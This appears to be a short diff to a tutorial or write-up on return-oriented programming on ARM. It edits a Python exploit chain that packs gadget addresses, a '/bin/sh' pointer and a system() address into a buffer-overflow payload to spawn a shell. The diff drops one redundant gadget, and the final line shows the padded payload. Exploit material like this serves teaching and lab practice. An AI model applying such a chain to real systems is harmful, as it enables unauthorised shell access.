@@ -89,8 +89,6 @@ Gadgets information
 >>> payload += struct.pack('<I',0x76edd12c)//pop {r0, r4, pc}
 >>> payload += struct.pack('<I',0x76f80c68)//"/bin/sh"
 >>> payload += "AAAA"
->>> payload += struct.pack('<I',0x76e7b670)//pop {r4, pc}
->>> payload += "AAAA"
 >>> payload += struct.pack('<I',0x76e9cfac)//system() call
 >>> io.write(payload)
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,ҭvh
